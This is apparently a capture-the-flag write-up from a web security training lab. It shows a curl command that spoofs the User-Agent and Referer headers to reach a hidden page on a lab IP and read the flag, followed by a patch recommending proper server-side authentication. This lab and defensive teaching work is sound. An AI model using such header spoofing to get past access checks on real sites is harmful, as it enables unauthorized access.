🚨 **EXPLOIT**

```
<!--
You must come from : "https://www.nsa.gov/".
Let's use this browser : "ft_bornToSec". It will help you a lot.
-->
```

The request fakes the required browser and referer to gain unauthorized access.

`curl -A "ft_bornToSec" -e "https://www.nsa.gov/" "http://192.168.38.130/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f" | grep flag`

---

✅ **PATCH**

1. Don’t rely solely on the User-Agent and Referer headers for security — these headers can be easily spoofed (e.g., via curl -A and -e).
2. Implement proper server-side authentication (e.g., sessions, tokens, OAuth).
